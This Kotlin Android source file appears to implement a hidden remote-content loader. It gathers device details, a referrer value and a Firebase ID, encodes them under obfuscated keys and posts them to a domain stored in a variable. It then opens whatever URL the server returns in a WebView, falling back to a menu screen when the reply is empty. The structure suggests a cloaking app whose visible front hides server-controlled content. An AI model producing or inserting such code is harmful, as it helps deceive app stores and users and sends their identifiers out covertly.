package com.kmp.pyr.roam

import android.content.Intent
import android.util.Log
import android.webkit.WebSettings
import androidx.activity.ComponentActivity
import androidx.lifecycle.lifecycleScope
import com.google.firebase.Firebase
import com.google.firebase.analytics.analytics
import com.kmp.pyr.roam.localdata.SaveManager
import com.kmp.pyr.roam.localdata.SaveManager.getData
import com.kmp.pyr.roam.localdata.SingleMap
import com.kmp.pyr.roam.localdata.checkToSend
import com.kmp.pyr.roam.localdata.dom
import com.kmp.pyr.roam.localdata.softText
import com.kmp.pyr.roam.localnav.LocalNavObj.point
import com.kmp.pyr.roam.localnav.ScreenManager
import com.kmp.pyr.roam.localnav.whenInit
import com.kmp.pyr.roam.util.PayloadEncoder.encodePayload
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import okhttp3.Call
import okhttp3.Callback
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import java.io.IOException
import java.util.concurrent.TimeUnit
import kotlin.onFailure
import kotlin.text.get

class StartCache(activity: ComponentActivity, intent: Intent) {
    var newView: ViewCustom = ViewCustom(activity, ClientCustom(activity))

    init {
        whenInit(intent)
    }

    fun newV(): ViewCustom {
        return newView
    }

    fun ifConnected(activity: ComponentActivity, startCache: StartCache) {
        activity.lifecycleScope.launch(Dispatchers.IO) {
            runCatching {
                val url = getData(activity)

                if (url.isBlank()) {
                    postM(activity, startCache)
                } else {
//                    Shortcutter.onGetSavedUrl(activity, true)
                    withContext(Dispatchers.Main) {
                        startCache.newV().getW().apply {
                            requestFocus()
                            loadUrl(url)
                        }
                    }
                }
            }
        }
    }

    suspend fun postM(activity: ComponentActivity, startCache: StartCache) {
        Log.d("KKKKK", "postM")
        val client = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(30, TimeUnit.SECONDS)
            .build()

        val map2 = buildMap {
            set(SingleMap.map["gk"]!! , runAfter(activity))
            set(SingleMap.map["rk"]!! , softText(activity))
            set(SingleMap.map["ei"]!! , getFirebaseId())
            set(SingleMap.map["p1"]!!, getTime(activity))
            set(SingleMap.map["p2"]!! , checkToSend(activity))
            set(SingleMap.map["p10"]!! , getDev())
//            set(SingleMap.map["p3"]!! , "loading|offer_shortcut")
//            set(SingleMap.map["p4"]!! , LoadingSdk.getLoadingValue())
//            set(SingleMap.map["p7"]!! , Shortcutter.getABVariant(activity))
        }

        val encoded = encodePayload(map2)

        val body = encoded.toRequestBody("text/plain".toMediaType())

        Log.d("KKKKK", "encoded: ${encoded}")
        Log.d("KKKKK", "body: ${body}")
        try {
            val request = Request.Builder()
                .url("https://$dom/${SingleMap.map["auth"]}")
                .post(body)
                .addHeader("User-Agent", WebSettings.getDefaultUserAgent(activity))
                .build()

            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    e.printStackTrace()
                    point(ScreenManager.MenuPoint)
                    Log.d("KKKKK", "response: $e")
                }

                override fun onResponse(call: Call, response: Response) {
                    Log.d("KKKKK", "response: $response")
                    response.use {
                        val payload = it.body.string()
                        Log.d("KKKKK", "payload: $payload")
                        if (payload.isBlank()) {
                            point(ScreenManager.MenuPoint)
                        } else {
                            runCatching {
                                Log.d("KKKKK", "decrypted: ${payload}")
                                CoroutineScope(Dispatchers.IO).launch {
                                    try {
                                        SaveManager.safeSave(activity, payload)
                                    } catch (_: Exception) {
                                    }
                                }

                                CoroutineScope(Dispatchers.Main).launch {
                                    runCatching {
                                        startCache.newView.loadUrl(payload)
                                    }.onFailure {
                                        point(ScreenManager.InternetProblem)
                                    }
                                }
                            }.onFailure {
                                point(ScreenManager.InternetProblem)
                            }
                        }
                    }
                }
            })
        } catch (e: Exception) {
            Log.d("KKKKK", "try: $e")
        }
    }


    private suspend fun getFirebaseId(): String =
        runCatching {
            Firebase.analytics.appInstanceId.await()
        }.getOrNull().orEmpty()

}
